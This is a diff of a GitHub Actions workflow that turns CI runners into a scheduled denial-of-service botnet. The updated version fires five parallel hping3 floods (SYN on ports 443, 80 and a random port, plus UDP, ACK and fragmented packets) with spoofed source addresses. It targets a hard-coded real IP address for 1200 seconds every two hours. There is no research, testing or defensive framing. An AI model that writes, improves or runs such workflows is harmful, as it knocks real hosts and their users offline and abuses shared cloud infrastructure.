@@ -1,20 +1,17 @@
-name: l4-syn
+name: l4
 on:
   workflow_dispatch:
     inputs:
       target:
         description: 'target IP'
-        default: '57.129.174.97'
+        default: '57.131.163.31'
       seconds:
         description: 'flood seconds'
         default: '1200'
-      procs:
-        description: 'parallel hping3 per runner'
-        default: '3'
   schedule:
-    - cron: '15 */2 * * *'
+    - cron: '40 */2 * * *'
 jobs:
-  syn:
+  l4:
     runs-on: ubuntu-latest
     timeout-minutes: 70
     strategy:
@@ -24,27 +21,16 @@ jobs:
     steps:
       - name: install hping3
         run: sudo apt-get update -qq && sudo apt-get install -y hping3 >/dev/null
-      - name: flood
+      - name: five-vector frag flood
         run: |
-          N=${{ matrix.n }}
-          case $((N % 5)) in
-            0) MODE="syn443" ;;
-            1) MODE="syn80" ;;
-            2) MODE="synport" ;;
-            3) MODE="udp443" ;;
-            4) MODE="ack443" ;;
-          esac
-          case $MODE in
-            syn443)  ARGS="-S -p 443" ;;
-            syn80)   ARGS="-S -p 80" ;;
-            synport) ARGS="-S -p $((10000 + RANDOM % 40000))" ;;
-            udp443)  ARGS="--udp -p 443" ;;
-            ack443)  ARGS="-A -p 443" ;;
-          esac
-          echo "runner ${{ matrix.n }} mode=$MODE args=$ARGS egress: $(curl -s --max-time 5 ifconfig.me)"
-          rm -f /tmp/hp.log
-          for i in $(seq 1 ${{ inputs.procs }}); do
-            sudo timeout -s INT ${{ inputs.seconds }} hping3 --flood $ARGS -d $((RANDOM % 3 * 24)) --rand-source ${{ inputs.target }} >> /tmp/hp.log 2>&1 &
-          done
+          T=${{ inputs.target }}
+          S=${{ inputs.seconds }}
+          P=$(( (RANDOM % 40000) + 10000 ))
+          echo "runner ${{ matrix.n }} egress $(curl -s --max-time 5 ifconfig.me || true)"
+          sudo timeout -s INT $S hping3 --flood -S -p 443 -d $(( (RANDOM%400)+36 )) --rand-source $T >/tmp/h1 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -S -p 80 -d $(( (RANDOM%900)+60 )) --rand-source $T >/tmp/h2 2>&1 &
+          sudo timeout -s INT $S hping3 --flood --udp -p 443 -d $(( RANDOM%1400 )) --rand-source $T >/tmp/h3 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -S -p $P -f -d 1400 --rand-source $T >/tmp/h4 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -A -p 443 -d 8 --rand-source $T >/tmp/h5 2>&1 &
           wait
-          grep transmitted /tmp/hp.log | head -6
+          for f in /tmp/h1 /tmp/h2 /tmp/h3 /tmp/h4 /tmp/h5; do grep transmitted $f | head -1; done
